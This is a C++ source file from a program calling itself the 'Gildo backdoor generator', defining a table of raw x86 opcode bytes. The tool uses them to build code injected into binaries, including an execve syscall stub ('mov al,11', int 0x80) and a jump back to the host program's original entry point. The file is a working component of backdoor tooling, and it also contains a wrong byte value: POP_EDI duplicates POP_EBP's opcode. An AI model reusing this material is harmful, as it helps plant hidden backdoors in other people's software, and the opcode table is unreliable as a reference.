/* instructionSet.C   the opcodes that my program recognizes
 *
 * Gildo backdoor generator is copyright (C) 2002 Mauro Meneghin.
 * All rights reserved. The software is redistributable under
 * the licence given in the file "Licence" distributed in the
 * Gbkdoor archive.
 */



#include "instructionSet.h"


InstructionSet IS;

//const OpCode InstructionSet::NOP=OpCode((unsigned char*)"\x90",1,"NOP");  //is shorter rewritten as above:
//OPV3("\x90",1,NOP);

  //xor
  OPV3("\x31\xc0",2,XOR_EAX_EAX);
  OPV3("\x31\xc9",2,XOR_ECX_ECX);
  OPV3("\x31\xd2",2,XOR_EDX_EDX);
  OPV3("\x31\xdb",2,XOR_EBX_EBX);
  OPV3("\x31\xe4",2,XOR_ESP_ESP);
  OPV3("\x31\xed",2,XOR_EBP_EBP);
  OPV3("\x31\xf6",2,XOR_ESI_ESI);
  OPV3("\x31\xff",2,XOR_EDI_EDI);
  
  //push
  OPV3("\x50",1,PUSH_EAX);
  OPV3("\x51",1,PUSH_ECX);
  OPV3("\x52",1,PUSH_EDX);
  OPV3("\x53",1,PUSH_EBX);
  OPV3("\x54",1,PUSH_ESP);
  OPV3("\x55",1,PUSH_EBP);
  OPV3("\x56",1,PUSH_ESI);
  OPV3("\x57",1,PUSH_EDI);
  //pop
  OPV3("\x58",1,POP_EAX);
  OPV3("\x59",1,POP_ECX);
  OPV3("\x5a",1,POP_EDX);
  OPV3("\x5b",1,POP_EBX);
  OPV3("\x5c",1,POP_ESP);
  OPV3("\x5d",1,POP_EBP);
  OPV3("\x5e",1,POP_ESI);
  OPV3("\x5d",1,POP_EDI);

  //mov
  OPV3("\x89\xe5",2,MOV_EBP_ESP);
  
  OPV3("\x90",1,NOP);
  OPV3("\xc3",1,RET);
  OPV3("\xc9",1,LEAVE);
  

//modifyable opcodes
  OPV4("\xeb\x00",2,JMP_BYTE,"\x00\xff");
  OPV4("\xe9\x00\x00\x00\x00",5,JMP_DWORD,"\x00\xff\xff\xff\xff"); 


//List1 opcodes:
//note: the syntax I have used is 'c' stay for content of like [...]
//      'p' stay for plus
  OPV4("\x80\x3c\x24\x00",4,CMPB_cESP_BYTE,"\x00\x00\x00\xff");  //cmp [esp], byte
  //if not greaterequaljmp to old entry point
  OPV4("\x7d\x05\xe9\x00\x00\x00\x00",7,JGEeJMP_DWORD,"\x00\x00\x00\xff\xff\xff\xff"); 
  OPV4("\xb0\x00",2,MOV_AL_BYTE,"\x00\xff"); //here mov al,11
  OPV4("\x8d\x4c\x24\x00",4,LEA_ECX_cESPpN,"\x00\x00\x00\xff"); //lea ecx,[esp+N]
  OPV3("\x8b\x19",2,MOV_EBX_cECX);  //mov ebx,[ecx]
  
  OPV3("\x89\xca",2,MOV_EDX_ECX); //NOT USED

  OPV3("\x89\xe2",2,MOV_EDX_ESP);
  OPV3("\xcd\x80",2,INT80);

















